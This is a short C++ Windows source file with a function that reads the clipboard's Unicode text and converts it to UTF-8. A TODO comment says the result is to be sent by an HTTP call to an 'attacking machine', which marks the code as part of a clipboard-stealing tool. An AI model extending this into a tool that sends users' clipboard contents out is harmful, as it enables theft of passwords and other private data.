#include <string>
#include <windows.h>
#include <tools.h>

// Extracting in UTF_16 format, Windows console could not show it properly
// TODO test if final result after HTTP call to attacking machine is correctly formatted for all symbols
std::string GetClipboardText()
{
    if(!OpenClipboard(nullptr))
    {
        return "Failed. Clipboard is not open.";
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);

    wchar_t* textArray = static_cast<wchar_t*>(GlobalLock(hData));
    if(textArray == nullptr)
    {
        CloseClipboard();
        return "Failed. Cannot lock clipboard memory location.";
    }

    std::wstring text(textArray);

    GlobalUnlock(hData);
    CloseClipboard();

    return WStringToUtf8(text);
}